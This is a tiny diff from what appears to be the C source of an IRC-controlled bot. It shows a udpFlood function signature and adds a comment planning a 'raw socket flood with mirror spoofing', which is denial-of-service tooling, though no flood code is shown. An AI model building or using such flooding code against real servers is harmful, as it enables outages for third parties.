@@ -137,6 +137,8 @@ pong (struct irc * bot, char * rcv)
     }
   }     
 }
+
+// todo add raw socket flood with mirror spoofing
 void
 udpFlood (char *server, int port, int times)
 {
